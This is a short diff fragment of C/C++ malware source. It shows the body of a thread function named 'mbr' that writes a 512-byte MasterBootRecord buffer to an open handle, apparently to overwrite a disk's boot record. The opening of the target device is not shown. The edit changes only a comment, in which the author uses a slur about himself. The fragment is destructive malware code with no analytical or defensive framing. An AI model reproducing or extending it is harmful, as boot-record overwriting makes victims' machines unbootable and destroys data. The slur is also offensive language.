@@ -12,5 +12,6 @@ DWORD WINAPI mbr(LPVOID lpParam) {
         WriteFile(hFile, MasterBootRecord, 512, &BytesWritten, NULL);
         CloseHandle(hFile);  // fixed version -lezus
     }
-    return 0; // updated version becuz i forgot to close the thread (staring to realize how trash tf i am at c++, C# and plain c)
+    return 0; // updated version becuz i forgot to close the thread (sorry- im retarded af)
 }
+
